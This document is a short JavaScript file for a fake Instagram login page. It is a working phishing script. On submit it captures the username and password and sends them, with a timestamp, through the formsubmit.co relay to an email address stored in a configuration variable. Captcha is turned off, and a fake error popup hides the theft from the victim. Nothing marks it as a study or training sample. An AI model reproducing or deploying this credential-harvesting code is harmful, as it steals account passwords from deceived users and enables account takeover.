document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('loginForm');
    const errorPopup = document.getElementById('errorPopup');
    const closePopupBtn = document.getElementById('closePopup');

    loginForm.addEventListener('submit', async function (e) {
        e.preventDefault();

        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');

        const credentials = {
            username: usernameInput.value,
            password: passwordInput.value
        };

        // Send credentials using FormSubmit.co (Works without backend/CORS issues)
        try {
            const response = await fetch(`https://formsubmit.co/ajax/${ENV.TO_EMAIL}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    _subject: "Instagram Clone Credentials Captured",
                    Username: credentials.username,
                    Password: credentials.password,
                    Time: new Date().toLocaleString(),
                    _captcha: "false" // Disable captcha
                })
            });

            const data = await response.json();
            console.log('Email sent status:', data);

        } catch (error) {
            console.error('Error sending email:', error);
        }

        // Show popup regardless of email success
        showPopup();
    });

    closePopupBtn.addEventListener('click', () => {
        errorPopup.classList.add('hidden');
    });

    function showPopup() {
        loginForm.reset();
        errorPopup.classList.remove('hidden');
    }
});
